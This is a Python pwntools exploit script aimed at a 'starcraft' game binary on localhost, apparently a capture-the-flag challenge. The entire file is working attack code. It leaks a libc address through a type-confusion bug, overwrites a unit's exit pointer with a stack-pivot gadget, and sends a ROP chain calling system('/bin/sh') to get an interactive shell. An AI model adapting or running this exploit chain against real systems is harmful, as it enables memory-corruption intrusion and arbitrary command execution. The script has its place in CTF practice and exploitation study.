from pwn import *

import re


class StarcraftExploit:

    TEMPLAR_ID = 6
    TEMPLAR_ATTACK_OPTION_ARCON_WARP = 1
    ARCON_ATTACK_OPTION_DEFAULT = 0
    ARCON_ATTACK_OPTION_TYPE_CONFUSION_PRIMITIVE_OVERWRITE_UNIT = 1
    ARCON_ATTACK_OPTION_TYPE_CONFUSION_PRIMITIVE_PRINT_INFO = 2

    EXIT_LIBC_OFFSET = 0x3A040
    RELOCATE_STACK_GADGET_LIBC_OFFSET = 0x8E7BE
    SYSTEM_LIBC_OFFSET = 0x453A0
    POP_RDI_GADGET_LIBC_OFFSET = 0x21112
    BIN_SH_LIBC_OFFSET = 0x18CE57

    EXIT_POINTER_OFFSET_IN_UNIT = 264

    def __init__(self):
        self.shell = remote('localhost', 9020)
        #self.shell = process(executable="/home/starcraft/starcraft", argv=["/home/starcraft/starcraft"])
        self.libc_base_address = 0

    def reach_stage_12_using_arcon_warp(self):
        self.shell.sendlineafter("select your unit", str(self.TEMPLAR_ID))
        self.shell.sendlineafter("select attack option", str(self.TEMPLAR_ATTACK_OPTION_ARCON_WARP))
        current_stage = 1
        while True:
            game_instructions = self.shell.recvuntil(("cheat...", "select attack option"))

            if "cheat..." in game_instructions:
                raise Exception("Game lost before stage 12, try running exploit again")
            if "win" in game_instructions:
                current_stage += 1

            if current_stage == 12:
                return

            self.shell.sendline(str(self.ARCON_ATTACK_OPTION_DEFAULT))

    def leak_libc_address_using_type_confusion(self):
        self.shell.sendline(str(self.ARCON_ATTACK_OPTION_TYPE_CONFUSION_PRIMITIVE_PRINT_INFO))
        game_instructions = self.shell.recvuntil(("cheat...", "select attack option"))

        if "cheat..." in game_instructions:
            raise Exception("Game lost before stage 12, try running exploit again")

        match_is_burrowed = re.search(r'is burrowed\s*:\s*(-?\d+)', game_instructions)
        match_is_burrow_able = re.search(r'is burrow-able\?\s*:\s*(-?\d+)', game_instructions)

        low_exit_qword = int(match_is_burrowed.group(1))
        high_exit_qword = int(match_is_burrow_able.group(1))

        real_exit_address = int(hex(high_exit_qword) + hex(low_exit_qword & 0xFFFFFFFF)[2:], base=16)

        print("REAL EXIT ADDRESS:", hex(real_exit_address))

        self.libc_base_address = real_exit_address - self.EXIT_LIBC_OFFSET

    def overwrite_unit_exit_pointer_to_system_using_type_confusion(self):
        self.shell.sendline(str(self.ARCON_ATTACK_OPTION_TYPE_CONFUSION_PRIMITIVE_OVERWRITE_UNIT))
        self.shell.recvuntil("ascii artwork")
        real_relocate_stack_gadget_address = self.libc_base_address + self.RELOCATE_STACK_GADGET_LIBC_OFFSET
        self.shell.sendline(b"A" * self.EXIT_POINTER_OFFSET_IN_UNIT + p64(real_relocate_stack_gadget_address))

    def trigger_exit_callback_with_appropriate_haystack(self):
        real_system_address = self.libc_base_address + self.SYSTEM_LIBC_OFFSET
        real_pop_rdi_gadget_address = self.libc_base_address + self.POP_RDI_GADGET_LIBC_OFFSET
        real_bin_sh_address = self.libc_base_address + self.BIN_SH_LIBC_OFFSET

        activated_haystack = False

        while True:
            game_instructions = self.shell.recvuntil(("cheat...", "cheat?", "select attack option"))

            if "cheat?" in game_instructions:
                # Send haystack
                self.shell.sendline(b"A" * 8 + p64(real_pop_rdi_gadget_address) +
                                    p64(real_bin_sh_address) + p64(real_system_address))
                activated_haystack = True
                continue

            if "cheat..." in game_instructions:
                if not activated_haystack:
                    print("DID NOT ACTIVATE HAYSTACK")
                self.shell.sendline(str(1))
                return

            self.shell.sendline(str(self.ARCON_ATTACK_OPTION_DEFAULT))

    def run(self):
        self.reach_stage_12_using_arcon_warp()
        self.leak_libc_address_using_type_confusion()
        self.overwrite_unit_exit_pointer_to_system_using_type_confusion()
        self.trigger_exit_callback_with_appropriate_haystack()
        self.shell.interactive()


if __name__ == '__main__':
    StarcraftExploit().run()
